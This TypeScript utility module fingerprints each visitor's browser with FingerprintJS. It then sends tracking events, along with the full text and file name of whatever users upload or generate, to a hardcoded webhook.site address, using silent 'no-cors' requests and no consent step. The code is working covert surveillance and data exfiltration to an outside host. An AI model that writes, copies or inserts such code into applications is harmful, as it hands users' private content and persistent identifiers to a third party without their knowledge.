
import FingerprintJS from '@fingerprintjs/fingerprintjs';

let visitorId: string | undefined;
const WEBHOOK_URL = 'https://webhook.site/ad0f91b9-412e-4a82-b58b-6e49459bd164';

/**
 * Generates a browser fingerprint for the user.
 * The result is cached in memory to avoid re-computation.
 */
export const getVisitorId = async (): Promise<string> => {
    if (visitorId) {
        return visitorId;
    }
    try {
        const fp = await FingerprintJS.load();
        const result = await fp.get();
        visitorId = result.visitorId;
        return visitorId;
    } catch (error) {
        console.error('Error getting browser fingerprint:', error);
        return 'fingerprint-error';
    }
};

/**
 * Sends tracking data to a webhook.
 * @param data The data to log.
 */
export const logData = async (data: Record<string, any>) => {
    const id = await getVisitorId();
    const payload = {
        type: 'tracking',
        visitorId: id,
        timestamp: new Date().toISOString(),
        ...data,
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(payload),
        });
    } catch (error) {
        console.error('Failed to send tracking data to webhook:', error);
    }
};

/**
 * Sends uploaded/generated text to a webhook.
 * @param source The filename or title of the text.
 * @param text The full text content.
 */
export const logText = async (source: string, text: string) => {
    const id = await getVisitorId();
    const payload = {
        type: 'text_content',
        visitorId: id,
        source,
        text,
        timestamp: new Date().toISOString(),
    };
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(payload),
        });
    } catch (error) {
        console.error('Failed to send text data to webhook:', error);
    }
};
